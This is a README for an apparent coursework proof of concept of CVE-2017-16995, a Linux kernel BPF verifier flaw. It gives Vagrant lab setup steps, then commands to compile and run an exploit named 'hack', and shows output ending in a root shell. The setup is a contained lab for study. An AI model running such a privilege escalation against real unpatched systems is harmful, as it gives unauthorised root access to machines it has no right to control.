# security_information_systems

### PoC of [CVE-2017-16995](https://www.cvedetails.com/cve/CVE-2017-16995/)
The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.

### Contents
- Vagrantfile
- script.sh

### Instructions
#### Getting all prepared
```shell
git clone https://github.com/Villaquiranm/security_information_systems.git
cd security_information_systems
```
#### Building Vagrant box
```shell
vagrant up
```
If during the build the message **"default: A newer version of the box 'ubuntu/xenial64' is available! You currently"** is diplayed, you will need to run this command.
```shell
vagrant box update
```
At this point it is necessary to wait because last instruction was to make a reboot in order to update all changes. This delay is approximately one minute after a successful build.

#### Accessing to vagrant box
```shell
vagrant ssh
```
If connexion is refused, it is because the box is still rebooting, wait some time and retry.

#### Checking everything
If you follow all steps correctly, now you can see something like this:
```shell
Last login: Sun Nov 25 20:00:11 2018 from 10.0.2.2
vagrant@ubuntu-xenial:~$
```
Your kernel version is "4.4.0-116-generic", you can consult your kernel version with:
```shell
uname -r
```
#### Using the exploit
 First we need to compile our exploit with gcc compiler
 ```shell
 gcc upstream44.c -o hack
 ```
 That will create an executable file called **hack**. Execute it to become sudo.
 ```shell
 ./hack
 ```

Normally the results should be:
```shell
task_struct = ffff880036b38000
uidptr = ffff880036f44784
spawning root shell
root@ubuntu-xenial:~#
```
